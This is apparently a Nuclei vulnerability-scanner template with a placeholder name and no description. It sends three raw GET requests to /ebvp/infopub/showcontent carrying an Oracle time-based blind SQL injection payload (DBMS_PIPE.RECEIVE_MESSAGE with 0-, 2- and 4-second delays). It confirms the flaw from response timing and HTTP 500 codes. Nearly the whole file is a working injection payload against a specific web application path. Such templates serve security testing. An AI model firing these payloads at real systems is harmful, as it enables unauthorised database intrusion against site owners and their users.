id: need_to_change

info:
  name: need_to_change
  author: msk
  severity: high



http:
  - raw:
      - |
        GET /ebvp/infopub/showcontent?id=1'%20AND%208538=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(102)||CHR(75)||CHR(79),0)%20AND%20'xYCQ'='xYCQ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
        Accept-Encoding: identity
        Connection: close
        Content-Type: text/xml; charset=utf-8

      - |
        GET /ebvp/infopub/showcontent?id=1'%20AND%208538=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(102)||CHR(75)||CHR(79),2)%20AND%20'xYCQ'='xYCQ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
        Accept-Encoding: identity
        Connection: close
        Content-Type: text/xml; charset=utf-8


      - |
        GET /ebvp/infopub/showcontent?id=1'%20AND%208538=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(102)||CHR(75)||CHR(79),4)%20AND%20'xYCQ'='xYCQ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
        Accept-Encoding: identity
        Connection: close
        Content-Type: text/xml; charset=utf-8

    max-size: 100
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=0  && duration_1<=2"
          - "duration_2>=2  && duration_2<=4"
          - "duration_3>=4  && duration_3<=6"
          - status_code_1==500 &&  status_code_2==500 && status_code_3==500 





